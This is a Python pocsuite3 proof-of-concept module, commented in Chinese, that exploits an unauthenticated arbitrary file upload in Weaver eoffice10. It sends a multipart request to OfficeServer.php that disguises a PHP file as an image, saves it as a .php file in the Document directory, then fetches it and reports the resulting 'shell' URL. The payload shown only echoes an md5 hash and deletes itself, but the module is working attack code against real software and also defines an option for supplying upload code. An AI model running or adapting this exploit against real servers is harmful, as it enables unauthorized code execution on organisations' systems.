from collections import OrderedDict
from urllib.parse import urljoin
import re,random,hashlib
from pocsuite3.api import POCBase, Output, register_poc, logger, requests, OptDict, OptString, VUL_TYPE
from pocsuite3.api import REVERSE_PAYLOAD, POC_CATEGORY


class POC(POCBase):
    vulID = '0'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1'  #默认为1
    author = ['']  #  PoC作者的大名
    vulDate = '2022-07-29'  #漏洞公开的时间,不知道就写今天
    createDate = '2022-07-29'  # 编写 PoC 的日期
    updateDate = '2022-07-29'  # PoC 更新的时间,默认和编写时间一样
    references = ['']  # 漏洞地址来源,0day不用写
    name = '泛微eoffice10前台任意文件上传漏洞'  # PoC 名称
    appPowerLink = ''  # 漏洞厂商主页地址
    appName = '泛微eoffice10'  # 漏洞应用名称
    appVersion = '''未知'''  # 漏洞影响版本
    vulType = VUL_TYPE.UPLOAD_FILES  #漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        通过 /eoffice10/version.json 查看版本
    '''

  # 漏洞简要描述
    samples = ['']  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = ['']  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    pocDesc = '''
    检测:pocsuite -r .\poc++.py -u url(-f url.txt) --verify 
    验证时会上传php 访问一次后自动删除，不对系统照成影响
    '''
    category = POC_CATEGORY.EXPLOITS.REMOTE

    def _options(self):
        o = OrderedDict()
        o["code"] = OptString(default='',description='输入需要上传的代码',require=False)
        return o

    def _verify(self):
        result = {}
         # 随机生成字符串
        str_num = str(random.randint(1000000000,9999999999))
        #计算md5值
        str_md5= hashlib.md5(str_num.encode()).hexdigest()
        path = "/eoffice10/server/public/iWebOffice2015/OfficeServer.php"
        headers={'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryQs59i0I4uaUw2Yhf'}
        url = self.url + path
        # 随机命名上传的文件名
        FormData = "{'USERNAME':'','RECORDID':'undefined','OPTION':'SAVEFILE','FILENAME':'"+str_num+".php'}"
        data='''
------WebKitFormBoundaryQs59i0I4uaUw2Yhf
Content-Disposition: form-data; name="FileData"; filename="1.jpg"
Content-Type: image/jpeg

<?php echo md5({num});unlink(__FILE__);?>
------WebKitFormBoundaryQs59i0I4uaUw2Yhf
Content-Disposition: form-data; name="FormData"

{FormData}
------WebKitFormBoundaryQs59i0I4uaUw2Yhf--'''.format(num=str_num,FormData=FormData)
        try:
            resq = requests.post(url=url,headers=headers,data=data,timeout=5)
            resq_results=requests.get(url=self.url+'/eoffice10/server/public/iWebOffice2015/Document/'+str_num+'.php',timeout=5)
            if resq.status_code == 200 and str_md5 in resq_results.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['POC'] = url
                result['VerifyInfo']['shell'] = self.url+'/eoffice10/server/public/iWebOffice2015/Document/'+str_num+'.php'
        except Exception as e:
            return
        return self.parse_output(result)

    def _attack(self):
            return self._verify()

    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _shell(self):
        return

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(POC)